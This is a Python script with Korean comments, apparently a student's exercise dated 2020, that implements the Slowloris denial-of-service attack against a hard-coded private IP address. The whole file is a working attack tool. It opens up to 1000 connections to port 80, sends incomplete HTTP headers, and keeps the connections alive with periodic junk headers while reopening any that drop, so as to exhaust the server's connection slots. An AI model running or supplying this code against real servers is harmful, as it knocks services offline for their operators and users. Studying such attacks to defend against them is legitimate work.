#-----------------------------------------------------------------------------------------------------------------------------------------------------

#                                           2020.12.17

#                                     유 주 환 학 생 Slowloris 작 성


import socket, random, time, sys

# 헤더의 변수에 User-agent 사용자정보와 사용자언어를 넣었다.
headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
]

# 소켓을 리스트 형식으로 선언
sockets = []


def setupSocket(ip):   # http 헤더 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        #socket 생성
    sock.settimeout(4)           # 타임아웃 4초 설정
    sock.connect((ip, 80))      # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))   # send로 http 헤더값을 전송한다. \r\n으로 줄바꿈을 시킨다. 
    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))    # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.

    return sock  # 객체 sock 안에 저장되어있는 http헤더를 리턴


if __name__ == "__main__":
    ip = "192.168.219.106"   # 공격할 대상의 IP 주소
    count = 1000    # count라는 변수에 몇번 반복할지 작성
    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))

    for _ in range(count):
        try:                    # 예외처리
            print("Socket {}".format(_)) # 소켓을 보낼때마다 몇번째인지 확인시켜준다.
            sock = setupSocket(ip)   # ip를 넣고 sock 이라는 객체에 저장한다. 
        except socket.error:  # 에러가 났을시 break문 실행
            break

        sockets.append(sock) # 아까 만들었던 sockets 라는 리스트에 sock을 추가한다.
        
    # 해당 포트가 닫혀있거나 연결할수있는 클라이언트가 꽉차거나 에러가 나서 while 문으로 넘어간다.
    
    while True:
        print("Connected to {} sockets. Sending headers...".format(len(sockets))) 

        for sock in list(sockets):   # sockets 객체에 저장되어있는 것들을 sock에 저장한다.
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8")) # http 헤더로 X -a: 1~4600 까지 랜덤한 수를 전송 http 헤더를 
                                                                                         # 불완전하게 전송한다.
              
            except socket.error:    # 에러가 났을시 sockets 안에 sock 리스트에 들어있는 값을 지운다. 
                sockets.remove(sock) 

        for _ in range(count - len(sockets)):     # count - len(sockets) 만큼 반복문을 진행한다.
            print("Re-opening closed sockets...") # 닫힌 소켓을 다시 여는중 이라는 출력문을 띄운다.
            try:
                sock = setupSocket(ip)        # HTTP 헤더 정보 생성
                if sock:
                    sockets.append(sock) # sockets 리스트 맨뒤에 sock을 추가한다.
            except socket.error:
                break    # 에러시 break 문

        time.sleep(15)  # 15초 동안 sleep



#-----------------------------------------------------------------------------------------------------------------------------------------------------
